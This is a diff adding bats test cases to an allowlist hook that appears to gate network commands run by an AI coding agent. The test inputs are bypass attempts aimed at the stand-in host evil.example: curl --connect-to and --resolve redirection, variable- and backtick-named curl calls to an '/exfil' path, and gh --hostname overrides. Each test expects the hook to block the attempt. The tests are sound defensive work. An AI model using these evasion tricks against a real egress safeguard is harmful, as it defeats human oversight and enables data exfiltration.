@@ -816,6 +816,70 @@ _call_hook_other() {
   echo "$output" | jq -er '.reason' | grep -q 'evil.example'
 }
 
+@test "AC-2 (Codex CR6-A): curl --connect-to redirected destination is validated" {
+  # `--connect-to api.github.com:443:evil.example:443` makes curl
+  # connect to evil.example despite the URL being api.github.com.
+  # Without parsing the flag, the gate would ALLOW (URL host is
+  # allowlisted). Now the 3rd field of --connect-to (the connect
+  # host) is extracted + checked.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --connect-to api.github.com:443:evil.example:443 https://api.github.com/'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR6-A): curl --resolve redirected destination is validated" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --resolve api.github.com:443:1.2.3.4 https://api.github.com/'
+  [ "$status" -eq 0 ]
+  # 1.2.3.4 isn't in the allowlist → block (the connect host is
+  # different from the URL host, so it must be validated).
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR6-A): curl --connect-to=URL=HOST form (=-glued) is validated" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --connect-to=api.github.com:443:evil.example:443 https://api.github.com/'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR6-B): variable-named command (\$c URL) is BLOCKED" {
+  # `c=curl; $c https://evil.example` — after `;` split, second
+  # segment is `$c https://evil.example`. cli=`$c` contains `$` →
+  # fail-CLOSED (cannot classify the actual binary at parse time).
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'c=curl; $c https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -qE 'shell expansion|unresolved'
+}
+
+@test "AC-2 (Codex CR6-B): backtick-named command (\`cmd\` URL) is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'cmd=curl; `cmd` https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR6-C): gh --hostname overrides GH_HOST and is validated" {
+  # `gh api --hostname evil.example /repos` should NOT pass just
+  # because github.com is allowlisted — the --hostname value wins.
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'gh api --hostname evil.example /repos/foo/bar'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR6-C): gh --hostname=allowed form (=-glued) is validated" {
+  echo 'evil.example' > "$ALLOWLIST"
+  run _call_hook_bash 'gh api --hostname=evil.example /repos/foo/bar'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 @test "AC-2 (Codex CR3): \$(curl evil) INSIDE SINGLE quotes is NOT a bypass (literal)" {
   # Single quotes are literal in bash — `echo '$(curl evil)'` prints
   # the string verbatim, no expansion. So the gate should ALLOW (the
